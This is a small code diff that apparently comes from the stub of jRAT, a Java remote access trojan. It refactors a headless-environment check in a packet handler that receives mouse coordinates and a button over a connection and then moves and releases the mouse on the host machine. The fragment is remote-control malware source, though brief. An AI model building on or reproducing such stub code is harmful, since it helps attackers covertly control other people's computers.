@@ -1,5 +1,6 @@
 package se.jrat.stub.packets.incoming;
 
+import se.jrat.common.utils.Utils;
 import se.jrat.stub.Connection;
 import se.jrat.stub.utils.ScreenUtils;
 
@@ -12,7 +13,7 @@ public class Packet93MouseRelease extends AbstractIncomingPacket {
 		int btn = con.readInt();
 		int monitor = con.readInt();
 		
-		if (!ScreenUtils.isHeadless()) {
+		if (!Utils.isHeadless()) {
 			if (monitor == -1) {
 				ScreenUtils.getDefault().mouseMove(x, y);
 				ScreenUtils.getDefault().mouseRelease(btn);
